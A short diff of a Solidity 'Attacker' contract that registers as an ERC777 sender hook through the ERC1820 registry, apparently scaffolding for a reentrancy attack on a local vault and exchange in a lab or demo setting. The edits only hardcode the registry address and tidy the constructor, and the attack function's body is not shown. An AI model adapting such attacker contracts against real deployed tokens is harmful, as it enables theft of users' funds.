@@ -7,10 +7,8 @@ import "node_modules/openzeppelin-solidity-3.4.0/token/ERC777/IERC777Sender.sol"
 import "./vault.sol";
 
 
-
-
 contract Attacker is IERC777Sender, ERC1820Implementer {
-    IERC1820Registry private _ERC1820_REGISTRY ;
+    IERC1820Registry private _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
 
     uint256 public numSend = 0;
     address public lastReceivedFrom;
@@ -19,13 +17,11 @@ contract Attacker is IERC777Sender, ERC1820Implementer {
       return numSend;
     }
 
-
     Exchange exchange;
 
-    MyERC777Token victim ;
+    MyERC777Token victim;
 
-    constructor(address registry, address _victim, address _exchange) payable{
-        _ERC1820_REGISTRY = IERC1820Registry(registry);
+    constructor(address _victim, address _exchange) payable {
         // register to ERC1820 registry
         _ERC1820_REGISTRY.setInterfaceImplementer(
         address(this),
@@ -35,9 +31,6 @@ contract Attacker is IERC777Sender, ERC1820Implementer {
 
         victim = MyERC777Token(_victim);
         exchange = Exchange(_exchange);
-
-      
-
     }
 
     function attack() external {
